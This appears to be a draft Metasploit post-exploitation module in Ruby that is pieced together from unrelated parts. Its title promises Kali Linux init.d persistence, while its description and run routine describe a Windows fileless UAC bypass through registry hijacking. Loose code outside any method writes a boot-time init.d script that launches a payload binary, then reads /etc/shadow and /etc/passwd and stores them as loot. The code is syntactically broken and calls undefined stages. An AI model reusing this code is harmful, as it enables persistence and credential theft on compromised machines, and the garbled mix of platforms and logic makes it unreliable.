##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : Kali_initd_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Linux Kali 2.0
#
#
#
# [ DESCRIPTION ]
##




# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/linux/priv'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix # ????
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::FILEFORMAT



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Kali binary[elf] init.d persistence module',
                        'Description'   => %q{
                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe OR powershell.exe to execute our command. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                ],
 
                        'Version'        => '$Revision: 2.1',
                        'DisclosureDate' => 'mar 16 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 | Windows 10
                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '5', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'http://x42.obscurechannel.com/?p=368' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',              # Default its to run againts session 1
                                         'VULN_SOFT' => 'eventvwr.exe', # Default its to run againts eventvwr.exe
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('EXEC_COMMAND', [ false, 'The command to be executed (eg start notepad.exe)']),
                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status/details?' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('VULN_SOFT', [ false, 'The binary/service vulnerable (eg CompMgmtLauncher.exe)']),
                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe -Command to execute our command?' , false]),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys?' , false])
                        ], self.class) 

        end


















#
# This is the init.d script that provides persistence
#
buf = ""
buf << #!/bin/sh
buf << ### BEGIN INIT INFO
buf << # Provides:          persistence on kali
buf << # Required-Start:    $network $local_fs $remote_fs
buf << # Required-Stop:     $remote_fs $local_fs     
buf << # Default-Start:     2 3 4 5
buf << # Default-Stop:      0 1 6  
buf << # Short-Description: Persiste your binary (elf) in kali linux.
buf << # Description:       Allows users to persiste your binary (elf) in kali linux systems    
buf << ### END INIT INFO
buf << #
buf << # Give a little time to execute elf agent
buf << sleep 5 > /dev/null
buf << # Execute binary (elf agent)
buf << ./PATH-TO-BINARY/ELF/PAYLOAD
file_create(buf)


# copy script to rite directory
cmd_exec("mv #{PATH}/#{NAME} /etc/init.d/#{NAME}")
cmd_exec("chmod +x /etc/init.d/#{NAME}")
cmd_exec("update-rc.d #{NAME} defaults # 97 03")



    if is_root?
      dmi_info = cmd_exec("/usr/sbin/dmidecode")
    end

    proc_scsi = read_file("/proc/scsi/scsi")


   paths = "/home/#{datastore['USERNAME']}/script"
   cmd_exec("mkdir -m 700 -p #{paths}")

   env_paths = cmd_exec("echo $PATH").split(":")


   cmd_exec("chmod 777 #{random_file_path}")
   cmd_exec("sh #{random_file_path}")

      passwd_file = read_file("/etc/passwd")
      shadow_file = read_file("/etc/shadow")
      # Save in loot the passwd and shadow file
      p1 = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
      p2 = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
      vprint_status("Shadow saved in: #{p1.to_s}")
      vprint_status("passwd saved in: #{p2.to_s}")









# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd



    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    | enigma fileless UAC bypass command execution |")
    print_line("    |            Author : r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['EXEC_COMMAND']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end

      if datastore['CHECK_VULN']
         ls_stage3
      end
   end
end
